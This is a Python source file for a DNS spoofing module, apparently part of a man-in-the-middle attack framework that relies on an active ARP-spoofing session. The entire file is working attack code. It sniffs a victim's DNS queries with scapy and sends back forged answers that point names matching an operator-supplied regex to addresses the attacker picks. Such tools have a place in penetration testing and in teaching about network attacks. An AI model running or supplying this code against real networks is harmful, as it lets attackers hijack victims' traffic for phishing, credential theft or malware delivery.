import stream
import util
import re
from scapy.all import *
from poison import Poison
from threading import Thread

class dns(Poison):
	"""DNS spoofing class
	"""

	def __init__(self):
		self.dns_spoofed_pair = {}
		self.dns_spoof = None
		self.dump = False
		self.source = None
		self.local_mac = None
		super(dns,self).__init__('DNS Spoof')

	def initialize(self):
		"""Initialize the DNS spoofer.  This is dependent
		   on a running ARP spoof; for now!
		"""
		try:
			arps = None
			key = None
			if 'ARPSpoof' in stream.HOUSE:
				house = stream.HOUSE['ARPSpoof']
			else:
				util.Error('ARP spoof required!')
				return

			while True:
				stream.dump_module_sessions('ARPSpoof')
				try:
					num = int(raw_input('[number] > '))
				except TypeError:
					continue
				if len(house.keys()) > num:
					key = house.keys()[num]
					arps = house[key]

					self.source = arps.to_ip
					self.local_mac = arps.local_mac
					break
				else:
					return
			
			dns_name = raw_input('[!] Enter regex to match DNS:\t')
			if dns_name in self.dns_spoofed_pair:
				util.Msg('DNS is already being spoofed (%s).'%(self.dns_spoofed_pair[dns_name]))
				return

			dns_spoofed = raw_input('[!] Spoof DNS entry matching %s to:\t'%(dns_name))
			tmp = raw_input('[!] Spoof DNS record \'%s\' to \'%s\'.  Is this correct?'%
								(dns_name,dns_spoofed))

			if 'n' in tmp.lower():
				return

			dns_name = re.compile(dns_name)
			self.dns_spoofed_pair[dns_name] = dns_spoofed
			self.dns_spoof = True

			util.Msg('Starting DNS spoofer...')
			thread = Thread(target=self.dns_sniffer)
			thread.start()
		except KeyboardInterrupt:
			return None
		except re.error:
			util.Error('Invalid regex given.')
			return None
		except Exception, j:
			util.Error('Error: %s'%j)
			return None
		return self.source

	def dns_sniffer(self):
		"""Listen for DNS packets
		"""
		sniff(filter='udp and port 53 and src %s'%self.source,store=0,prn=self.spoof_dns,
						stopper=self.test_stop, stopperTimeout=3)

	def spoof_dns(self, pkt):
		"""Receive packets and spoof if necessary
		"""
		if DNSQR in pkt and pkt[Ether].src != self.local_mac:
			for dns in self.dns_spoofed_pair.keys():
				tmp = dns.search(pkt[DNSQR].qname)
				if not tmp is None and not tmp.group(0) is None:
					p = Ether(dst=pkt[Ether].src, src=self.local_mac)
					p /= IP(src=pkt[IP].dst,dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport,sport=pkt[UDP].dport)
					p /= DNS(id=pkt[DNS].id,qr=1L,rd=1L,ra=1L,an=DNSRR(rrname=pkt[DNS].qd.qname,
											type='A',rclass='IN',ttl=40000,rdata=self.dns_spoofed_pair[dns]),
											qd=pkt[DNS].qd)
					sendp(p,count=1)
					if self.dump: util.Msg('Caught request to %s'%pkt[DNSQR].qname)
		del(pkt)
	
	def test_stop(self):
		"""Test if we're still spoofing
		"""
		if self.dns_spoof:
			return False
		util.debug('Stopping DNS spoofer...')
		return True

	def shutdown(self):
		"""Stop DNS spoofing
		"""
		if self.dns_spoof:
			self.dns_spoof = False
			self.dns_spoofed_pair.clear()
			util.debug('DNS spoofing shutdown.')
		return

	def session_view(self):
		""" Return what to print when viewing sessions
		"""
		data = self.source + '\n'
		for (cnt,dns) in enumerate(self.dns_spoofed_pair):
			data += '\t|-> [%d] %s -> %s\n'%(cnt, dns.pattern, self.dns_spoofed_pair[dns])
		return data
